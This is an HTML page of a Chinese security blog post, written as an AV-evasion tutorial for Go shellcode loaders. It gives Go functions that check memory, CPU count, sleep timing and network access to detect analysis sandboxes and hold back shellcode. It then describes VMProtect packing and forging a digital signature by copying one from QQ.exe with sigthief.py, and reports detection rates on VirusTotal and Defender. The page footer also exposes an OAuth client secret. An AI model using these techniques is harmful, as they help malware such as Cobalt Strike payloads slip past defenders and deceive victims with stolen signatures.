@@ -1,0 +1,325 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>基于Go实现沙箱检测和条件触发(Ⅱ) | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="基于Go实现沙箱检测和条件触发(Ⅱ) | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+因为微步和VT之类的都是虚拟环境运行，所以说可以通过一些沙箱检测的手段，来让shellcode不被加载，从而达到防检测的目的。
+沙箱检测
+1、检测系统物理内存大小是否大于4G
+func physicalMemory() (int, e..." />
+    <meta name="keywords" content="免杀,Golang" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              基于Go实现沙箱检测和条件触发(Ⅱ)
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-09-04
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/0FG9kkW6t8/" class="post-tag">
+                  # 免杀
+                </a>
+              
+                <a href="https://le1a.github.io/tag/eI9NmbuONN/" class="post-tag">
+                  # Golang
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>因为微步和VT之类的都是虚拟环境运行，所以说可以通过一些沙箱检测的手段，来让shellcode不被加载，从而达到防检测的目的。</p>
+<h1 id="沙箱检测">沙箱检测</h1>
+<p><strong>1、检测系统物理内存大小是否大于4G</strong></p>
+<pre><code class="language-go">func physicalMemory() (int, error) {
+   var mod = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)//懒加载dll
+   var proc = mod.NewProc(&quot;GetPhysicallyInstalledSystemMemory&quot;)//获取 检测系统内存大小的函数
+   var mem uint64 //开个这个系统内存中的变量  然后传入函数，返回内存大小
+   proc.Call(uintptr(unsafe.Pointer(&amp;mem)))
+   mem = mem / 1048576 //内存大小/1G，如果小于4，则返回0，大于4则返回1
+   if mem &lt; 4 {
+      return 0, nil
+   }
+   return 1, nil
+}
+
+physicalMemory, _ := physicalMemory()//物理内存是否大于4g，大于4g返回1
+</code></pre>
+<p><strong>2、延迟运行</strong></p>
+<pre><code class="language-go">//延迟运行
+func timeSleep() (int, error) {
+   startTime := time.Now()
+   time.Sleep(5 * time.Second)
+   endTime := time.Now()
+   sleepTime := endTime.Sub(startTime)
+   if sleepTime &gt;= 5*time.Second { //判断是否延时成功，成功返回1，失败返回0
+      return 1, nil
+   } else {
+      return 0, nil
+   }
+}
+
+sleeptime, _ := timeSleep() //延迟运行是否成功
+</code></pre>
+<p><strong>3、检测CPU核心数</strong></p>
+<pre><code class="language-go">func numberOfCPU() (int, error) {
+   a := runtime.NumCPU()
+   if a &lt; 4 {
+      return 0, nil
+   } else {
+      return 1, nil
+   }
+}
+cpuNumber, _ := numberOfCPU()//cpu核心数量，大于4返回1
+</code></pre>
+<h1 id="条件触发">条件触发</h1>
+<p>因为大多数沙盒是没通外网的，所以网络连通性正常的时候，再执行shellcode，能一定程度上绕过沙箱检测</p>
+<pre><code class="language-go">//检测网络连通性
+func NetworkCheck() (int, error){
+   u, _ := url.Parse(&quot;https://www.baidu.com/&quot;)  //检查网络连通性
+   q := u.Query()
+   u.RawQuery = q.Encode()
+   res, err := http.Get(u.String())
+   resCode := res.StatusCode
+   res.Body.Close()
+   if resCode == 200{
+      return 1, err
+   }
+   return 0, err
+}
+resStatus, _ := NetworkCheck()//检测网络连通性
+</code></pre>
+<h1 id="改exe资源属性-加壳-伪造数字签名">改exe资源属性、加壳、伪造数字签名</h1>
+<p>通过这些方法可以更为有效的加大沙箱分析检测的难度，从而使得免杀效果更好。</p>
+<p><strong>1、改图标</strong></p>
+<p>改ico图标可以通过<code>ResourceHacker</code>这个工具来修改，只需要把exe拖进去，然后再添加ico格式的图片再保存即可</p>
+<p><strong>2、加壳</strong></p>
+<p>这里选择加VMP壳，直接通过<code>VMProtect Ultimate</code>把exe打开，然后再编译就行了，就可以得到一个xxx.vmp.exe</p>
+<p><strong>3、伪造数字签名</strong></p>
+<p>这里伪造数字签名可以使用<code>sigthief.py</code></p>
+<pre><code>py sigthief.py -i &quot;想要窃取证书的exe路径(例如QQ.exe)&quot; -t xxx.vmp.exe -o xxx.exe(最后输出的文件名)
+</code></pre>
+<p>然后就得到了加了数字签名的exe。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/04/1617dacf8ca96.png" alt="image-20220904152802883" loading="lazy"></figure>
+<h1 id="免杀效果">免杀效果</h1>
+<h3 id="微步在线沙箱-122"><strong>微步在线沙箱  1/22</strong></h3>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/04/197eb8ed1324b.png" alt="image-20220904152839845" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/04/30868fcc15931.png" alt="image-20220904152935393" loading="lazy"></figure>
+<h3 id="vt-970"><strong>VT 9/70</strong></h3>
+<p>能过国内所有杀软，以及绝大部分国外杀软。</p>
+<h3 id="windwos-defender">Windwos Defender</h3>
+<p>能过静态查杀，过不了动态查杀。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/04/b176271e119e6.png" alt="image-20220904153152935" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/04/1d18e1ce3fe10.png" alt="image-20220904153226271" loading="lazy"></figure>
+<p>运行猫猫.exe，就会被动态查杀了，检测出CS特征。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/04/1ee3d22551a95.png" alt="image-20220904153535820" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E6%B2%99%E7%AE%B1%E6%A3%80%E6%B5%8B">沙箱检测</a></li>
+<li><a href="#%E6%9D%A1%E4%BB%B6%E8%A7%A6%E5%8F%91">条件触发</a></li>
+<li><a href="#%E6%94%B9exe%E8%B5%84%E6%BA%90%E5%B1%9E%E6%80%A7-%E5%8A%A0%E5%A3%B3-%E4%BC%AA%E9%80%A0%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D">改exe资源属性、加壳、伪造数字签名</a></li>
+<li><a href="#%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C">免杀效果</a><br>
+*
+<ul>
+<li><a href="#%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E6%B2%99%E7%AE%B1-122"><strong>微步在线沙箱  1/22</strong></a></li>
+<li><a href="#vt-970"><strong>VT 9/70</strong></a></li>
+<li><a href="#windwos-defender">Windwos Defender</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/基于Go加载shellcode/">
+              <h3 class="post-title">
+                基于Go加载shellcode(Ⅰ)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
